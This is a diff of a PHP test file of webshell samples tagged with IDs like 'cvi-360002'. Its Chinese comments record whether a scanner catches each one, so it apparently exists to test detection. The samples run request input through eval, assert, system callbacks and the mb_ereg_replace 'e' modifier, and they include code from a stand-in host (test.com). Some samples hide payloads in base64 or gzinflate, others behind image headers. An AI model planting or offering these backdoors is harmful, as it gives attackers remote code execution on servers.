@@ -1,41 +1,66 @@
-<?php
-//cvi-360001
-eval($_POST['C']);
-
 //cvi-360002
-$a="ss";
-include("sss.jpg");
+include "sss.jpg";
+include("sss_tmp");
+require_once "http://www.test.com/sss.php";
 
-//cvi-360003
-echo '###m7lrvok###';$a=$_POST['m7lrv'];$b;$b=$a;@eval($a)
+//扫不出来....
+$a="http://www.test.com/sss.php";
+require_once $a;
 
-//cvi-360004
-$string = 'AABBCCDDEE';
-preg_replace($_POST['A'], $_POST['B'], $string);
+//cvi-360016
+filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
+//cvi-360017 换行挂
+$op=array('options' => 'assert');
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, $op);
 
-//cvi-360005 ?????
-$a = $_POST['A']; preg_replace($a, $_POST['B'], $string);
+//cvi-360018 一句话
+mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
+//cvi-360019 换行挂
+$e = "\ise";
+$data = mb_ereg_replace("/[^A-Za-z0-9\.\-]/","",$data,$e);
 
-//cvi-360006   换行就挂
-$b = $_POST['B'];  preg_replace($_POST['A'], $b, $string);
+//cvi-360022
+ini_set('allow_url_include, 1'); // Allow url inclusion in this script
+include('php://input');
 
-//cvi-360007
-array_map("ass\x65rt",(array)$_REQUEST['expdoor']);
+//cvi-360023   特征值
+GIF87a<?php
+BM<?php
 
-//cvi-360008
+//cvi-360026  
+$cb= 'system';
+ob_start($cb);
+echo $_GET[c];
+ob_end_flush();
 
-//cvi-360009
-$e = $_REQUEST['e'];
-$arr = array($_POST['pass'],);
-array_filter($arr, base64_decode($e));
+$evalstr="";
+ob_start(function ($c,$d){global $evalstr;$evalstr=$c;});
+echo $_REQUEST['pass'];
+ob_end_flush();
+assert($evalstr);
 
-//cvi-360010  换行就挂
-$e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, base64_decode($e));
+ob_start(function ($c,$d){register_shutdown_function('assert',$c);});
+echo $_REQUEST['pass'];
+ob_end_flush();
 
-//cvi-360011  换行就挂
-$newfunc = create_function(null,'assert($_POST[c]);');$newfunc();
+//cvi-360028  一句话
+eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
 
-//cvi-360012  换行就挂
-$newfunc = create_function('str','return str');$newfunc("$_POST['c']");
+
+//cvi-360034 一句话
+$_POST['sa']($_POST['sb']);
+$_POST['sa']($_POST['sb'],$_POST['sc']);
+
+$sa = $_POST['sa'];
+$sa($_POST['sb']);
+
+$sa = $_POST['sa'];
+$sb = $_POST['sb'];
+$sa($sb);
+
+$sa = $_POST['sa'];
+$_POST($sa );
+
+
 ?>
-
